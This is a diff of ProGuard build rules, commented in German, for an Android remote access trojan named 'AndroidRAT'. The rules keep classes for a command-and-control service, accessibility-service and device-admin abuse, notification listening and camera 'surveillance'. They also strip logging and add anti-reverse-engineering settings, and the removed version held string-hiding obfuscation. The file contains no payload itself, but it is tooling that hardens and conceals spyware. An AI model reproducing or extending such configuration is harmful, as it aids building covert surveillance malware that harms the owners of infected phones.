@@ -1,98 +1,114 @@
-# Keep all activities, services, and broadcast receivers, as they are entry points
+# AndroidRAT ProGuard Rules - Android 15 Optimiert
+# Version 2.0 - September 2025
+
+# ============================================================
+# Grundlegende Android-Regeln
+# ============================================================
+
+# Android Support & AndroidX
+-keep class androidx.** { *; }
+-keep interface androidx.** { *; }
+-dontwarn androidx.**
+
+# Core Android Komponenten behalten
 -keep public class * extends android.app.Activity
--keep public class * extends android.app.Application
 -keep public class * extends android.app.Service
 -keep public class * extends android.content.BroadcastReceiver
--keep public class * extends android.content.ContentProvider
--keep public class * extends android.app.backup.BackupAgentHelper
--keep public class * extends android.preference.Preference
--keep public class com.android.vending.licensing.ILicensingService
+-keep public class * extends android.accessibilityservice.AccessibilityService
+-keep public class * extends android.service.notification.NotificationListenerService
+-keep public class * extends android.app.admin.DeviceAdminReceiver
 
-# Keep native methods
+# ============================================================
+# AndroidRAT Spezifische Regeln (KRITISCH!)
+# ============================================================
+
+# Alle RAT-Komponenten behalten (keine Obfuskation für Debugging)
+-keep class com.example.client.** { *; }
+-keepclassmembers class com.example.client.** { *; }
+
+# Reflection-verwendete Klassen schützen
+-keepattributes Signature
+-keepattributes *Annotation*
+-keepattributes EnclosingMethod
+-keepattributes InnerClasses
+
+# Native Methods behalten
 -keepclasseswithmembernames class * {
     native <methods>;
 }
 
-# Keep custom views
--keep public class * extends android.view.View {
-    public <init>(android.content.Context);
-    public <init>(android.content.Context, android.util.AttributeSet);
-    public <init>(android.content.Context, android.util.AttributeSet, int);
-    public void set*(...);
+# ============================================================
+# Kryptographie & Sicherheit
+# ============================================================
+
+# BouncyCastle Kryptographie behalten
+-keep class org.bouncycastle.** { *; }
+-dontwarn org.bouncycastle.**
+
+# AndroidX Security
+-keep class androidx.security.crypto.** { *; }
+-dontwarn androidx.security.crypto.**
+
+# Javax Crypto
+-keep class javax.crypto.** { *; }
+-keep class javax.security.** { *; }
+
+# ============================================================
+# Netzwerk & Kommunikation
+# ============================================================
+
+# OkHttp3 & Retrofit
+-keep class okhttp3.** { *; }
+-keep interface okhttp3.** { *; }
+-dontwarn okhttp3.**
+
+-keep class retrofit2.** { *; }
+-dontwarn retrofit2.**
+
+# Gson (JSON Serialization)
+-keep class com.google.gson.** { *; }
+-keepclassmembers,allowobfuscation class * {
+    @com.google.gson.annotations.SerializedName <fields>;
 }
 
-# Keep enums
--keepclassmembers enum * {
-    public static **[] values();
-    public static ** valueOf(java.lang.String);
-}
+# ============================================================
+# Android 15 Spezifische Regeln
+# ============================================================
 
-# Keep parcelable classes
--keep class * implements android.os.Parcelable {
-  public static final android.os.Parcelable$Creator *;
-}
+# Edge-to-Edge UI Support
+-keep class androidx.activity.** { *; }
+-keep class androidx.core.view.** { *; }
 
-# Keep R class members
--keepclassmembers class **.R$* {
-    public static <fields>;
-}
+# Foreground Service Types
+-keep class android.app.Service { *; }
+-keep class android.content.pm.ServiceInfo { *; }
 
-# Keep our specific services and receivers referenced in the manifest
--keep class com.example.client.MainActivity
--keep class com.example.client.C2Service
--keep class com.example.client.BootReceiver
--keep class com.example.client.AdminReceiver
--keep class com.example.client.RATAccessibilityService
+# Scoped Storage
+-keep class android.provider.MediaStore { *; }
+-keep class androidx.core.content.FileProvider { *; }
 
-# Keep new security classes but obfuscate methods
--keep class com.example.client.SecureConfig {
-    public static getInstance(android.content.Context);
-}
--keep class com.example.client.CryptoManager {
-    public <init>();
-    public void generateNewKey();
-    public boolean hasKey();
-}
--keep class com.example.client.AuthManager {
-    public <init>(android.content.Context);
-    public boolean isAuthenticated();
-}
--keep class com.example.client.IntegrityValidator {
-    public <init>(android.content.Context);
-    public com.example.client.IntegrityValidator$SecurityCheckResult performSecurityCheck();
-}
+# Camera2 API (für Surveillance)
+-keep class androidx.camera.** { *; }
+-dontwarn androidx.camera.**
 
-# Keep result classes for integrity checks
--keep class com.example.client.IntegrityValidator$SecurityCheckResult {
-    public boolean overallSecure;
-    public java.lang.String error;
-}
+# ============================================================
+# Anti-Reverse-Engineering (Optional)
+# ============================================================
 
-# Enhanced obfuscation settings
--overloadaggressively
--repackageclasses 'a'
--allowaccessmodification
--mergeinterfacesaggressively
-
-# String obfuscation - hide sensitive strings
--adaptclassstrings
--adaptresourcefilenames **.xml
-
-# Advanced optimizations
--optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
--optimizationpasses 5
-
-# Keep JSON classes but obfuscate method names where possible
--keep class org.json.** { *; }
-
-# Security: Hide reflection usage
--keepattributes *Annotation*
-
-# Anti-tampering: Make reverse engineering harder
+# Source File Namen entfernen
 -renamesourcefileattribute SourceFile
+
+# Line Numbers für Stack Traces behalten (debugging)
 -keepattributes SourceFile,LineNumberTable
 
-# Hide crypto-related strings
+# String-Verschleierung (optional, kann Probleme verursachen)
+# -obfuscate
+
+# ============================================================
+# Logging entfernen (Release Build)
+# ============================================================
+
+# Android Log entfernen
 -assumenosideeffects class android.util.Log {
     public static *** d(...);
     public static *** v(...);
@@ -101,20 +117,41 @@
     public static *** e(...);
 }
 
-# Keep SSL/TLS classes for secure communication
--keep class javax.net.ssl.** { *; }
--keep class javax.crypto.** { *; }
+# Timber Logging entfernen
+-assumenosideeffects class timber.log.Timber {
+    public static *** d(...);
+    public static *** v(...);
+    public static *** i(...);
+    public static *** w(...);
+    public static *** e(...);
+}
 
-# Additional security measures
--dontwarn javax.crypto.**
--dontwarn java.security.**
+# ============================================================
+# Optimization Flags
+# ============================================================
 
-# Keep BouncyCastle if used
--keep class org.bouncycastle.** { *; }
--dontwarn org.bouncycastle.**
+# Optimierung aktivieren
+-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
 
-# Android security framework
--keep class androidx.security.crypto.** { *; }
+# Iterations für Optimierung
+-optimizationpasses 5
 
-# Root detection library
--keep class com.scottyab.rootbeer.** { *; }
+# Attribute für Optimierung behalten
+-keepattributes *Annotation*,Signature,Exception
+
+# ============================================================
+# Warnings unterdrücken
+# ============================================================
+
+-dontwarn javax.annotation.**
+-dontwarn org.conscrypt.**
+-dontwarn org.openjsse.**
+
+# ============================================================
+# ENDE DER PROGUARD RULES
+# ============================================================
+
+# Version: 2.0
+# Android: 15 (API Level 35)
+# Optimiert für: One UI 7
+# Letzte Aktualisierung: September 2025
